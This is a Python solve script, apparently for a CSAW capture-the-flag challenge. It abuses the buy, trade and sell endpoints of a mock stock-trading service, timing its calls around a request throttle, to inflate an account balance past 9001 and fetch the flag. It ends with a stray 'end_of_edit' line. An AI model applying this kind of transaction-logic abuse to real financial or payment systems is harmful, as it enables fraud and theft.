import requests
import time
import json
import uuid

BASE = "http://android-dropper.csaw.io:4657"
KEY = "win_" + uuid.uuid4().hex[:8]
CHEAP = "GOOBER"
RICH = "BURPSHARKHAT"

s = requests.Session()

def post(path, data):
    r = s.post(BASE + path, data=data, timeout=5)
    print(path, data, "=>", r.text)
    return r.text

def login():
    return json.loads(post("/login", {"key": KEY}))

print("KEY", KEY)
st = login()
print("start", st)

post("/buy", {"key": KEY, "stock": CHEAP})
time.sleep(2)

while True:
    st = login()
    print("state", st)
    if st["balance"] >= 9001:
        break
    post("/buy", {"key": KEY, "stock": "AAPLISH"})
    time.sleep(1)
    post("/trade", {"key": KEY, "stock": CHEAP, "stock1": RICH})
    for _ in range(11):
        post("/buy", {"key": KEY, "stock": "AAPLISH"})
    time.sleep(2)
    post("/sell", {"key": KEY, "stock": RICH})
    time.sleep(1)
    print("waiting for throttle reset")
    time.sleep(11)

print("final", login())
flag = post("/flag", {"key": KEY})
print("FLAG:", flag)
end_of_edit
